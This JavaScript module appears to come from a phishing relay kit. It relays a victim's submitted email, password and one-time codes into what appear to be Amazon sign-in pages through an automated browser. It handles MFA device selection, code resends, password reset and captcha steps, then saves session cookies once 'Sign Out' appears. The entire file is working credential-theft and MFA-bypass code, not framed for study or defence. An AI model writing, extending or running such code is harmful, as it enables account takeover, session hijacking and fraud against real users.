const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let email = `[id="ap_email"]`
                await page.waitForSelector(email)

                await page.evaluate(() => {
                    document.querySelector(`[id="ap_email"]`).value = ""
                })

                await page.type(email, this.email)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Sign Out"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {
                let email = `[id="ap_email"]`
                await page.waitForSelector(email)

                await page.evaluate(() => {
                    document.querySelector(`[id="ap_email"]`).value = ""
                })

                await page.type(email, body.email)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "home-password") {
                let password = `[id="ap_password"]`
                await page.waitForSelector(password)

                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "otp-code") {
                let otp_code = `[id="auth-mfa-otpcode"]`
                await page.waitForSelector(otp_code)

                await page.type(otp_code, body.otpCode)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "resend-code") {
                let resendbtn = `#auth-get-new-otp-link`
                await page.waitForSelector(resendbtn)

                await page.click(resendbtn)
                await new Promise(re => setTimeout(re, 3000))
            } else if (spikeType == "otp-device") {
                await page.evaluate(() => {
                    document.querySelectorAll(`[type="radio"]`).forEach((inp, index) => {
                        inp.setAttribute("spike-device", index)
                    })
                })

                const currentDevice = `[spike-device="${body.otpDeviceContext}"]`
                await page.waitForSelector(currentDevice)

                await page.click(currentDevice)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "forget-password") {
                let forget_passwordBtn = "#auth-fpp-link-bottom"
                await page.waitForSelector(forget_passwordBtn)

                await page.click(forget_passwordBtn)
                await new Promise(re => setTimeout(re, 2500))
                const html = await page.content()
                if (html.includes("Solve this puzzle")) {
                    await new Promise(re => setTimeout(re, 3000))
                }
            } else if (spikeType == "forgetpass-otp-code") {
                let sel = `[name="code"]`
                await page.waitForSelector(sel)
                await page.type(sel, body.code)

                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "forget-password-resend-code") {
                const resendpassBtn = `#cvf-resend-link`
                await page.waitForSelector(resendpassBtn)

                await page.click(resendpassBtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "keywords-captcha") {
                let sel = `[name="field-keywords"]`
                await page.waitForSelector(sel)
                await page.type(sel, body["field-keywords"])

                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "load" })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }